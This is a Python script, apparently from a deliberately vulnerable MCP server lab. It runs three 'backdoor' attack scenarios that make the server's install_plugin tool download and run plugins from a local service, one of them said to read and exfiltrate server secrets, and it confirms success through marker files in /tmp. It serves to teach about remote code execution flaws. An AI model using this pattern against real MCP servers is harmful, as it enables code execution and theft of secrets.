#!/usr/bin/env python3
"""
Backdoor Attack Demonstrations

This script demonstrates backdoor/RCE attack techniques against the vulnerable MCP server.

Backdoor Attack: The MCP server downloads and executes external plugins/executables
without validation, allowing attackers to execute arbitrary code on the server.

Vulnerability: The MCP server has an install_plugin tool that downloads and executes
code from external URLs without any validation, allowing remote code execution (RCE).

Attack Flow:
1. Attacker hosts malicious plugin on external service
2. Attacker requests MCP server to install plugin from malicious URL
3. MCP server downloads plugin without validation
4. MCP server executes plugin code immediately
5. Malicious code runs with MCP server privileges (can access secrets, files, etc.)
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
import signal
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# Track background processes for cleanup
background_processes = []

# Track successful attacks
successful_attacks = []


# Backdoor Attack Scenarios
BACKDOOR_ATTACK_SCENARIOS = [
    {
        "name": "Backdoor - Cache Optimizer Plugin",
        "description": "Malicious plugin that looks legitimate but creates marker files and accesses secrets",
        "url": "http://127.0.0.1:8002/plugin/optimizer.py",
        "expected": "Plugin downloads and executes, creating marker file and accessing system info",
        "marker_file": "/tmp/rce_test_optimizer.txt",
        "attack_type": "python_execution"
    },
    {
        "name": "Backdoor - Cache Helper Plugin",
        "description": "Another malicious plugin that executes arbitrary code on the server",
        "url": "http://127.0.0.1:8002/plugin/cache_helper.py",
        "expected": "Plugin executes and creates marker file with system information",
        "marker_file": "/tmp/rce_test_cache_helper.txt",
        "attack_type": "python_execution"
    },
    {
        "name": "Backdoor - Secrets Exfiltration Plugin",
        "description": "Malicious plugin that reads MCP server secrets and creates exfiltration file",
        "url": "http://127.0.0.1:8002/plugin/secrets_exfil.py",
        "expected": "Plugin reads secrets from MCP server and writes them to a file",
        "marker_file": "/tmp/backdoor_secrets_exfiltrated.txt",
        "attack_type": "secrets_exfiltration"
    }
]


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    print(f"[START] Starting {name} on port {port}...")
    try:
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait for service to start (check multiple times)
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                print(f"[OK] {name} started successfully on port {port}")
                return process
        print(f"[WARNING] {name} may not have started properly")
        return process
    except Exception as e:
        print(f"[ERROR] Failed to start {name}: {e}")
        return None


def cleanup_processes():
    """Clean up all background processes"""
    print("\n[CLEANUP] Stopping background services...")
    for process in background_processes:
        try:
            process.terminate()
            process.wait(timeout=5)
            print(f"[CLEANUP] Stopped process {process.pid}")
        except:
            try:
                process.kill()
            except:
                pass
    background_processes.clear()


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    cleanup_processes()
    sys.exit(0)


async def run_backdoor_attack(mcp_client, attack_scenario):
    """Run a backdoor attack by installing malicious plugin"""
    
    print(f"\n{'='*80}")
    print(f"  Attack #{attack_scenario.get('number', '?')}: {attack_scenario['name']}")
    print(f"{'='*80}")
    print(f"Description: {attack_scenario['description']}")
    print(f"Plugin URL: {attack_scenario['url']}")
    print(f"Expected: {attack_scenario['expected']}")
    print(f"Marker file: {attack_scenario.get('marker_file', 'N/A')}")
    print(f"{'─'*80}\n")
    
    print(f"[ATTACK] Requesting MCP server to install plugin from: {attack_scenario['url']}")
    print(f"[VULNERABILITY] MCP server will download and execute this code without validation!")
    
    # Check if marker file exists before attack
    marker_file = Path(attack_scenario.get('marker_file', ''))
    marker_exists_before = marker_file.exists() if marker_file else False
    
    try:
        result = await mcp_client.call_tool("install_plugin", {"url": attack_scenario['url']})
        
        print(f"\n[RESULT] MCP server response:")
        print(json.dumps(result, indent=2))
        
        if "error" in result:
            print(f"\n[INFO] Attack attempted but plugin execution failed")
            print(f"[ERROR] {result.get('error', 'Unknown error')}")
        elif result.get("status") == "success":
            print(f"\n[SUCCESS] ⚠️  BACKDOOR ATTACK SUCCESSFUL!")
            print(f"[SUCCESS] Malicious plugin was downloaded and executed on the MCP server")
            
            # Check if marker file was created (proves code execution)
            if marker_file and marker_file.exists():
                print(f"\n[PROOF] Marker file created: {marker_file}")
                print(f"[PROOF] This proves that the malicious code executed on the server!")
                
                # Read marker file contents
                try:
                    marker_content = marker_file.read_text()
                    print(f"\n[MARKER FILE CONTENTS]")
                    print(f"{'─'*80}")
                    print(marker_content)
                    print(f"{'─'*80}")
                except Exception as e:
                    print(f"[WARNING] Could not read marker file: {e}")
                
                successful_attacks.append({
                    "attack": attack_scenario['name'],
                    "url": attack_scenario['url'],
                    "marker_file": str(marker_file),
                    "execution_result": result.get("execution_result", {})
                })
            else:
                print(f"\n[NOTE] Marker file not found: {marker_file}")
                print(f"[NOTE] Plugin may have executed but didn't create expected marker file")
            
            # Show execution result if available
            if "execution_result" in result:
                print(f"\n[EXECUTION RESULT]")
                print(json.dumps(result["execution_result"], indent=2))
        
    except Exception as e:
        print(f"\n[ERROR] Attack failed with exception: {e}")
        import traceback
        traceback.print_exc()


async def run_all_backdoor_attacks():
    """Run all backdoor attack demonstrations"""
    
    # Register signal handler for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("\n" + "="*80)
    print("  BACKDOOR/RCE ATTACK DEMONSTRATIONS")
    print("="*80)
    print("\nThis script demonstrates backdoor/RCE attack techniques against the vulnerable MCP server.")
    print("\nBackdoor Attack: The MCP server downloads and executes external plugins/executables")
    print("without validation, allowing attackers to execute arbitrary code on the server.")
    print("\n[AUTO-START] Checking and starting required services...")
    print("="*80 + "\n")
    
    # Check and start RCE service (port 8002)
    rce_service_started = False
    if not check_service_running(8002):
        print("[INFO] RCE service (port 8002) not running, starting it...")
        process = start_service("RCE Service", "external_service.rce_service", 8002)
        if process:
            background_processes.append(process)
            rce_service_started = True
    else:
        print("[OK] RCE service (port 8002) is already running (will reuse existing)")
    
    # Wait a bit for services to be ready
    if rce_service_started:
        print("[WAIT] Waiting for services to be ready...")
        time.sleep(2)
    
    print("\n[WARNING] Testing backdoor attacks - malicious plugins will be executed!")
    print("="*80 + "\n")
    
    # Number the attacks
    for i, attack in enumerate(BACKDOOR_ATTACK_SCENARIOS, 1):
        attack['number'] = i
    
    # Create MCP client
    print("[INIT] Connecting to MCP server...")
    mcp_client = await create_mcp_client()
    print("[OK] Connected to MCP server\n")
    
    # Run all attacks
    print(f"[RUN] Running {len(BACKDOOR_ATTACK_SCENARIOS)} backdoor attack scenarios...\n")
    
    for attack_scenario in BACKDOOR_ATTACK_SCENARIOS:
        await run_backdoor_attack(mcp_client, attack_scenario)
        time.sleep(1)  # Small delay between attacks
    
    # Cleanup
    await mcp_client.cleanup()
    
    # Summary
    print("\n" + "="*80)
    print("  BACKDOOR ATTACK DEMONSTRATION COMPLETE")
    print("="*80)
    print(f"\nSummary:")
    print(f"  Total attacks attempted: {len(BACKDOOR_ATTACK_SCENARIOS)}")
    print(f"  Successful attacks: {len(successful_attacks)}")
    
    if successful_attacks:
        print(f"\n  Successful Backdoor Attacks:")
        for attack in successful_attacks:
            print(f"    ✓ {attack['attack']}")
            print(f"      URL: {attack['url']}")
            print(f"      Marker file: {attack['marker_file']}")
    
    print("\n  Vulnerability Summary:")
    print("    - MCP server downloads plugins from external URLs without validation")
    print("    - MCP server executes plugin code immediately without verification")
    print("    - No URL whitelist or content validation")
    print("    - No code signing or integrity checks")
    print("    - Arbitrary code execution (RCE) vulnerability")
    print("="*80 + "\n")
    
    # Cleanup background processes
    cleanup_processes()


if __name__ == "__main__":
    try:
        asyncio.run(run_all_backdoor_attacks())
    except KeyboardInterrupt:
        print("\n[INTERRUPTED] Attack demonstration interrupted by user")
        cleanup_processes()
        sys.exit(0)
    except Exception as e:
        print(f"\n[ERROR] Attack demonstration failed: {e}")
        import traceback
        traceback.print_exc()
        cleanup_processes()
        sys.exit(1)
